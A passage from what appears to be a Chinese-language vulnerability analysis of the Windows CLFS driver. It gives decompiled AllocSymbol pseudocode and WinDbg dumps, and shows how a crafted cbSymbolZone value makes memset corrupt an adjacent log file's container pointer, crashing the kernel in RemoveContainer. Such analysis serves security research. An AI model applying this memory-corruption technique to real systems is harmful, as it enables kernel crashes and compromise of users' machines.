style="color:#ae81ff">10</span> ee<span style="color:#ae81ff">11</span> ........<span style="color:#960050;background-color:#1e0010">'</span>..<span style="color:#f92672">&amp;</span>....</span></span></code></pre></div><p>回到<code>AllocSymbol</code>中，由于<code>SignatureOffset</code>变为<code>0XFFFF0050</code>，导致即使<code>cbSymbolZone</code> 被设为<code>00000000</code>0001114b<code> 也可以通过if条件判断，到达</code>memset`</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">__int64</span><span style="color:#66d9ef">__fastcall</span> CClfsBaseFilePersisted<span style="color:#f92672">::</span><span style="color:#a6e22e">AllocSymbol</span>(CClfsBaseFilePersisted<span style="color:#f92672">*</span>this,<span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">int</span> a2,<span style="color:#66d9ef">void</span><span style="color:#f92672">**</span>a3)</span></span><span style="display:flex;"><span>{</span></span><span style="display:flex;"><span><span style="color:#66d9ef">__int64</span> v4;<span style="color:#75715e">// rbp</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/> CLFS_BASE_RECORD_HEADER<span style="color:#f92672">*</span>BaseLogRecord;<span style="color:#75715e">// rax</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#66d9ef">__int64</span> v6;<span style="color:#75715e">// r8 this指针</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/> CLFS_BASE_RECORD_HEADER<span style="color:#f92672">*</span>v7;<span style="color:#75715e">// rdi</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/> CLFS_LOG_BLOCK_HEADER<span style="color:#f92672">*</span>v8;<span style="color:#75715e">// rcx</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#66d9ef">__int64</span> cbSymbolZone;<span style="color:#75715e">// r8</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#66d9ef">char</span><span style="color:#f92672">*</span>v10;<span style="color:#75715e">// rbx</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#66d9ef">__int64</span> result;<span style="color:#75715e">// rax</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/></span></span><span style="display:flex;"><span> v4<span style="color:#f92672">=</span> a2;</span></span><span style="display:flex;"><span> BaseLogRecord<span style="color:#f92672">=</span> (CLFS_BASE_RECORD_HEADER<span style="color:#f92672">*</span>)CClfsBaseFile<span style="color:#f92672">::</span><span style="color:#a6e22e">GetBaseLogRecord</span>(this);</span></span><span style="display:flex;"><span> v7<span style="color:#f92672">=</span> BaseLogRecord;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>BaseLogRecord )</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span><span style="color:#ae81ff">3222929421</span>i64;</span></span><span style="display:flex;"><span> v8<span style="color:#f92672">=</span><span style="color:#f92672">*</span>(CLFS_LOG_BLOCK_HEADER<span style="color:#f92672">**</span>)(<span style="color:#f92672">*</span>(_QWORD<span style="color:#f92672">*</span>)(v6<span style="color:#f92672">+</span><span style="color:#ae81ff">48</span>)<span style="color:#f92672">+</span><span style="color:#ae81ff">48</span>i64);</span></span><span style="display:flex;"><span><span style="color:#f92672">*</span>a3<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>i64;</span></span><span style="display:flex;"><span> cbSymbolZone<span style="color:#f92672">=</span> BaseLogRecord<span style="color:#f92672">-></span>cbSymbolZone;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ( (<span style="color:#66d9ef">char</span><span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>BaseLogRecord[<span style="color:#ae81ff">1</span>]<span style="color:#f92672">+</span> cbSymbolZone<span style="color:#f92672">+</span> v4<span style="color:#f92672">></span> (<span style="color:#66d9ef">char</span><span style="color:#f92672">*</span>)(<span style="color:#f92672">&amp;</span>v8<span style="color:#f92672">-></span>MajorVersion<span style="color:#f92672">+</span> v8<span style="color:#f92672">-></span>SignaturesOffset) )</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span><span style="color:#ae81ff">3221225507</span>i64;</span></span><span style="display:flex;"><span> v10<span style="color:#f92672">=</span> (<span style="color:#66d9ef">char</span><span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>BaseLogRecord[<span style="color:#ae81ff">1</span>]<span style="color:#f92672">+</span> cbSymbolZone;</span></span><span style="display:flex;"><span><span style="color:#a6e22e">memset</span>(v10,<span style="color:#ae81ff">0</span>, (<span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">int</span>)v4);</span></span><span style="display:flex;"><span> v7<span style="color:#f92672">-></span>cbSymbolZone<span style="color:#f92672">+=</span> v4;</span></span><span style="display:flex;"><span> result<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>i64;</span></span><span style="display:flex;"><span><span style="color:#f92672">*</span>a3<span style="color:#f92672">=</span> v10;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span> result;</span></span><span style="display:flex;"><span>}</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span> kd<span style="color:#f92672">></span> dq rax<span style="color:#f92672">+</span><span style="color:#ae81ff">0x1328</span></span></span><span style="display:flex;"><span>ffffa78f<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">9468</span>c398<span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">0001114</span>b<span style="color:#ae81ff">00000001</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">03030000</span></span></span><span style="display:flex;"><span>ffffa78f<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">9468</span>c3a8<span style="color:#ae81ff">00000030</span><span style="color:#960050;background-color:#1e0010">`</span>c1fdf006<span style="color:#ae81ff">000000</span>b8<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">02</span>d20016</span></span><span style="display:flex;"><span>ffffa78f<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">9468</span>c3b8<span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00000000</span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00000000</span></span></span><span style="display:flex;"><span>ffffa78f<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">9468</span>c3c8<span style="color:#ae81ff">0000136</span><span style="color:#ae81ff">8</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">000013f</span><span style="color:#ae81ff">0</span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00000000</span></span></span><span style="display:flex;"><span>ffffa78f<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">9468</span>c3d8<span style="color:#ae81ff">000000</span><span style="color:#ae81ff">88</span><span style="color:#960050;background-color:#1e0010">`</span>c1fdf007<span style="color:#ae81ff">0000</span><span style="color:#ae81ff">9</span>c40<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">01000000</span></span></span><span style="display:flex;"><span>ffffa78f<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">9468</span>c3e8<span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00000000</span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00000000</span></span></span><span style="display:flex;"><span>ffffa78f<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">9468</span>c3f8<span style="color:#ae81ff">01100000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00000000</span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00000000</span></span></span><span style="display:flex;"><span>ffffa78f<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">9468</span>c408<span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00000000</span> ffffffff<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00000000</span></span></span></code></pre></div><p>那么此处为什么要设为<code>0x1114b</code>呢。</p><p>在多次创建日志文件后，后面创建的每个日志文件的<code>Base log record</code>的内存间距稳定在<code>0x11000</code></p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span> kd<span style="color:#f92672">></span> db rax<span style="color:#f92672">-</span><span style="color:#ae81ff">0x70</span><span style="color:#f92672">+</span><span style="color:#ae81ff">0x11000</span></span></span><span style="display:flex;"><span>ffffa78f<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">9469</span>c000<span style="color:#ae81ff">15</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">03</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">3</span>d<span style="color:#ae81ff">00</span><span style="color:#ae81ff">3</span>d<span style="color:#ae81ff">00</span><span style="color:#f92672">-</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span> ....<span style="color:#f92672">=</span>.<span style="color:#f92672">=</span>.........</span></span><span style="display:flex;"><span>ffffa78f<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">9469</span>c010<span style="color:#ae81ff">02</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#f92672">-</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span> ff ff ff ff ................</span></span><span style="display:flex;"><span>ffffa78f<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">9469</span>c020<span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span> ff ff ff ff<span style="color:#f92672">-</span><span style="color:#ae81ff">70</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span> ........p.......</span></span><span style="display:flex;"><span>ffffa78f<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">9469</span>c030<span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#f92672">-</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span> ................</span></span><span style="display:flex;"><span>ffffa78f<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">9469</span>c040<span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#f92672">-</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span> ................</span></span><span style="display:flex;"><span>ffffa78f<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">9469</span>c050<span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#f92672">-</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span> ................</span></span><span style="display:flex;"><span>ffffa78f<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">9469</span>c060<span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#f92672">-</span><span style="color:#ae81ff">80</span><span style="color:#ae81ff">79</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span> .........y......</span></span><span style="display:flex;"><span>ffffa78f<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">9469</span>c070<span style="color:#ae81ff">05</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#f92672">-</span><span style="color:#ae81ff">93</span><span style="color:#ae81ff">76</span><span style="color:#ae81ff">34</span><span style="color:#ae81ff">8f</span><span style="color:#ae81ff">1</span>b<span style="color:#ae81ff">10</span> ee<span style="color:#ae81ff">11</span> .........v4.....</span></span></code></pre></div><p>此处在调试器中后一个日志文件的<code>container context</code>偏移为0x1468</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span> kd<span style="color:#f92672">></span> dw ffffa78f<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">9469</span>c000<span style="color:#f92672">+</span><span style="color:#ae81ff">0x70</span><span style="color:#f92672">+</span><span style="color:#ae81ff">0x328</span></span></span><span style="display:flex;"><span>ffffa78f<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">9469</span>c398<span style="color:#ae81ff">1468</span><span style="color:#ae81ff">0000</span><span style="color:#ae81ff">0000</span><span style="color:#ae81ff">0000</span><span style="color:#ae81ff">0000</span><span style="color:#ae81ff">0000</span><span style="color:#ae81ff">0000</span><span style="color:#ae81ff">0000</span></span></span><span style="display:flex;"><span>ffffa78f<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">9469</span>c3a8<span style="color:#ae81ff">0000</span><span style="color:#ae81ff">0000</span><span style="color:#ae81ff">0000</span><span style="color:#ae81ff">0000</span><span style="color:#ae81ff">0000</span><span style="color:#ae81ff">0000</span><span style="color:#ae81ff">0000</span><span style="color:#ae81ff">0000</span></span></span><span style="display:flex;"><span>ffffa78f<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">9469</span>c3b8<span style="color:#ae81ff">0000</span><span style="color:#ae81ff">0000</span><span style="color:#ae81ff">0000</span><span style="color:#ae81ff">0000</span><span style="color:#ae81ff">0000</span><span style="color:#ae81ff">0000</span><span style="color:#ae81ff">0000</span><span style="color:#ae81ff">0000</span></span></span><span style="display:flex;"><span>ffffa78f<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">9469</span>c3c8<span style="color:#ae81ff">0000</span><span style="color:#ae81ff">0000</span><span style="color:#ae81ff">0000</span><span style="color:#ae81ff">0000</span><span style="color:#ae81ff">0000</span><span style="color:#ae81ff">0000</span><span style="color:#ae81ff">0000</span><span style="color:#ae81ff">0000</span></span></span><span style="display:flex;"><span>ffffa78f<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">9469</span>c3d8<span style="color:#ae81ff">0000</span><span style="color:#ae81ff">0000</span><span style="color:#ae81ff">0000</span><span style="color:#ae81ff">0000</span><span style="color:#ae81ff">0000</span><span style="color:#ae81ff">0000</span><span style="color:#ae81ff">0000</span><span style="color:#ae81ff">0000</span></span></span><span style="display:flex;"><span>ffffa78f<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">9469</span>c3e8<span style="color:#ae81ff">0000</span><span style="color:#ae81ff">0000</span><span style="color:#ae81ff">0000</span><span style="color:#ae81ff">0000</span><span style="color:#ae81ff">0000</span><span style="color:#ae81ff">0000</span><span style="color:#ae81ff">0000</span><span style="color:#ae81ff">0000</span></span></span><span style="display:flex;"><span>ffffa78f<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">9469</span>c3f8<span style="color:#ae81ff">0000</span><span style="color:#ae81ff">0000</span><span style="color:#ae81ff">0000</span><span style="color:#ae81ff">0000</span><span style="color:#ae81ff">0000</span><span style="color:#ae81ff">0000</span><span style="color:#ae81ff">0000</span><span style="color:#ae81ff">0000</span></span></span><span style="display:flex;"><span>ffffa78f<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">9469</span>c408<span style="color:#ae81ff">0000</span><span style="color:#ae81ff">0000</span><span style="color:#ae81ff">0000</span><span style="color:#ae81ff">0000</span><span style="color:#ae81ff">0000</span><span style="color:#ae81ff">0000</span><span style="color:#ae81ff">0000</span><span style="color:#ae81ff">0000</span></span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span> kd<span style="color:#f92672">></span> dd ffffa78f<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">9469</span>c000<span style="color:#f92672">+</span><span style="color:#ae81ff">0x70</span><span style="color:#f92672">+</span><span style="color:#ae81ff">0x1468</span></span></span><span style="display:flex;"><span>ffffa78f<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">9469</span>d4d8 c1fdf008<span style="color:#ae81ff">00000030</span><span style="color:#ae81ff">000</span><span style="color:#ae81ff">80000</span><span style="color:#ae81ff">00000000</span></span></span><span style="display:flex;"><span>ffffa78f<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">9469</span>d4e8<span style="color:#ae81ff">00000000</span><span style="color:#ae81ff">00000000</span><span style="color:#ae81ff">93e0</span>d330 ffffa78f</span></span><span style="display:flex;"><span>ffffa78f<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">9469</span>d4f8<span style="color:#ae81ff">00000001</span><span style="color:#ae81ff">00000002</span><span style="color:#ae81ff">00000000</span><span style="color:#ae81ff">00000000</span></span></span><span style="display:flex;"><span>ffffa78f<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">9469</span>d508<span style="color:#ae81ff">003f</span><span style="color:#ae81ff">005</span>c<span style="color:#ae81ff">005</span>c003f<span style="color:#ae81ff">003</span>a0043<span style="color:#ae81ff">0055005</span>c</span></span><span style="display:flex;"><span>ffffa78f<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">9469</span>d518<span style="color:#ae81ff">00650073</span><span style="color:#ae81ff">00730072</span><span style="color:#ae81ff">0050005</span>c<span style="color:#ae81ff">00620075</span></span></span><span style="display:flex;"><span>ffffa78f<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">9469</span>d528<span style="color:#ae81ff">006</span><span style="color:#ae81ff">9006</span>c<span style="color:#ae81ff">005</span>c0063<span style="color:#ae81ff">0063002</span>e<span style="color:#ae81ff">006e006</span>f</span></span><span style="display:flex;"><span>ffffa78f<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">9469</span>d538<span style="color:#ae81ff">00610074</span><span style="color:#ae81ff">006e0069</span><span style="color:#ae81ff">00720065</span><span style="color:#ae81ff">0031005f</span></span></span><span style="display:flex;"><span>ffffa78f<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">9469</span>d548<span style="color:#ae81ff">00340031</span><span style="color:#ae81ff">00360037</span><span style="color:#ae81ff">0000003</span><span style="color:#ae81ff">9</span><span style="color:#ae81ff">00000000</span></span></span></code></pre></div><p>根据伪代码可知<code>memset</code>的位置为<code>BaseLogRecord + 0x 1338 + cbSymbolZone</code></p><p>如果要利用前一个日志文件在<code>AllocSymbol</code>时修改后一个日志文件的<code>container context→pContainer</code>的高四位则应满足下列条件</p><p><code>ffffa78f</code>9469d4f4 = BaseLogRecord + 0x1338 + cbSymbolZone`，计算可得</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span> kd<span style="color:#f92672">></span><span style="color:#f92672">?</span>ffffa78f<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">9469</span>d4f4<span style="color:#f92672">-</span><span style="color:#ae81ff">0x1338</span><span style="color:#f92672">-</span> rax</span></span><span style="display:flex;"><span>Evaluate expression:<span style="color:#ae81ff">69964</span><span style="color:#f92672">=</span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">0001114</span>c</span></span></code></pre></div><p>通过<code>memset</code>将指针高四位清零后，通过NtSetInformationFile函数为container文件设置属性13（关闭时删除文件）。在关闭日志文件句柄时会调用<code>CClfsBaseFilePersisted::RemoveContainer</code>函数移除container，在该函数中会获取<code>container context</code>并解引用<code>container context→pContainer</code>，由于指针损坏，导致蓝屏。</p><p>在<code>CLFS!CClfsBaseFilePersisted::RemoveContainer</code> 断点</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>bp CLFS<span style="color:#f92672">!</span>CClfsBaseFilePersisted<span style="color:#f92672">::</span>RemoveContainer</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">1</span><span style="color:#f92672">:</span> kd<span style="color:#f92672">></span> db r15</span></span><span style="display:flex;"><span>ffffd70e<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">48</span>d9d4d8<span style="color:#ae81ff">08</span> f0 fd c1<span style="color:#ae81ff">30</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#f92672">-</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">08</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span> ...<span style="color:#ae81ff">.0</span>...........</span></span><span style="display:flex;"><span>ffffd70e<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">48</span>d9d4e8<span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#f92672">-</span>e0<span style="color:#ae81ff">37</span> c1<span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span> ........<span style="color:#ae81ff">.7</span>......</span></span><span style="display:flex;"><span>ffffd70e<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">48</span>d9d4f8<span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#f92672">-</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span> ................</span></span><span style="display:flex;"><span>ffffd70e<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">48</span>d9d508<span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#f92672">-</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span> ................</span></span><span style="display:flex;"><span>ffffd70e<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">48</span>d9d518<span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#f92672">-</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span> ................</span></span><span style="display:flex;"><span>ffffd70e<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">48</span>d9d528<span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#f92672">-</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span> ................</span></span><span style="display:flex;"><span>ffffd70e<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">48</span>d9d538<span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#f92672">-</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span> ................</span></span><span style="display:flex;"><span>ffffd70e<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">48</span>d9d548<span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#f92672">-</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span> ................</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">1</span><span style="color:#f92672">:</span> kd<span style="color:#f92672">></span> k</span></span><span style="display:flex;"><span><span style="color:#75715e"># Child-SP RetAddr Call Site</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#ae81ff">00</span> fffff88e<span style="color:#960050;background-color:#1e0010">`</span>db5aa5e0 fffff806<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">0</span>b6f120b CLFS<span style="color:#f92672">!</span>CClfsBaseFilePersisted<span style="color:#f92672">::</span>RemoveContainer<span style="color:#f92672">+</span><span style="color:#ae81ff">0x10f</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff">01</span> fffff88e<span style="color:#960050;background-color:#1e0010">`</span>db5aa640 fffff806<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">0</span>b6f8b0f CLFS<span style="color:#f92672">!</span>CClfsLogFcbPhysical<span style="color:#f92672">::</span>DeleteBaseFileAndContainers<span style="color:#f92672">+</span><span style="color:#ae81ff">0xf3</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff">02</span> fffff88e<span style="color:#960050;background-color:#1e0010">`</span>db5aa690 fffff806<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">0</span>b6f8761 CLFS<span style="color:#f92672">!</span>CClfsLogFcbPhysical<span 